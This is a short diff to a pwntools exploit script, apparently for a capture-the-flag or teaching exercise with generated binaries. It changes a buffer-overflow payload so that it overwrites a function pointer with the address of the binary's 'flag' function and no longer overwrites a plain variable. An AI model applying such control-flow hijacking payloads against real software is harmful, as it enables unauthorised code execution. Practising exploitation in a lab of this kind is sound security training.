@@ -8,11 +8,11 @@ e = ELF(gen_filename)
 p = e.process()
 
 buff = gen_names["buffer"]
-mod = gen_names["modified"]
+fp = gen_names["fp"]
 
 payload = b''
-payload += (gen_var_locations[mod][-1] - gen_var_locations[buff][-1]) * b'a'
-payload += b'b'
+payload += (gen_var_locations[fp][-1] - gen_var_locations[buff][-1]) * b'a'
+payload += p64(e.symbols['flag'])
 p.sendline(payload)
 
 p.stream()
